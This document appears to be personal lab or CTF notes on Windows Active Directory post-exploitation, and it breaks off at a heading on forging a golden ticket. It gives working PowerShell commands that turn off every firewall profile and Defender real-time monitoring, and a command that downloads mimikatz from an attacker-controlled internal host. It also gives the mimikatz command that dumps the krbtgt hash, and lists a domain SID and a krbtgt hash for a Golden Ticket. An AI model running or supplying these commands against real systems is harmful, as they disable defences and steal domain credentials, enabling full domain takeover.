


Disabling firewall
Set-NetFirewallProfile -Profile Domain, Private,Public -Enabled False
Get-NetFirewallProfile | Select-Object Name, Enabled

<img width="1043" height="538" alt="image" src="https://github.com/user-attachments/assets/a291ad37-bc17-4ecf-98f7-cfa5a23338c0" />

To check if the "Real time monitoring is on"
Get-MpPreference | Select-Object DisableRealtimeMonitoring

To disable " Real time monitoring"
Set-MpPreference -DisableRealtimeMonitoring $true

The command below was used when Certutil failed
 Invoke-WebRequest -Uri http://10.10.10.17:8110/mimikatz.exe -OutFile C:\Users\app-svc\Downloads\mimikatz.exe

<img width="1016" height="508" alt="image" src="https://github.com/user-attachments/assets/7ec2d507-cbb3-4a59-a689-70524dcffb3b" />





# Golden Ticket

conditions for the Golden ticket
- SID :  S-1-5-21-2499068589-3795281702-463835139
- KRBtGT hash : f3118544a831e728781d780cfdb9c1fa
  
TO run LSA DUMP


using mimikatz to dump,
lsadump::lsa /inject /krbtgt
 
<img width="1013" height="714" alt="image" src="https://github.com/user-attachments/assets/aa529598-5883-4400-a189-a52255a80761" />


## Forging a golden ticket 
